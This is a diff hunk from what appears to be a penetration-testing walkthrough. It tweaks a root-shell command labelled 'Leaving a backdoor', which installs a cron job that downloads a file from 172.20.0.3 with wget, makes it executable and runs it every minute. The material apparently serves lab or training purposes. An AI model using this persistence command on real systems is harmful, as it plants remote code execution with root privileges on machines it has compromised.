@@ -126,7 +126,7 @@ shell
 From root shell:
 ```bash
 # Leaving a backdoor
-echo '* * * * * root cd /tmp; wget 172.20.0.3/backdoor && chmod +x backdoor && ./backdoor' > /etc/cron.d/backdoor
+echo '* * * * * root cd /tmp; wget 172.20.0.3/backdoor -O backdoor && chmod +x backdoor && ./backdoor' > /etc/cron.d/backdoor
 ```
 
 From another kali terminal:
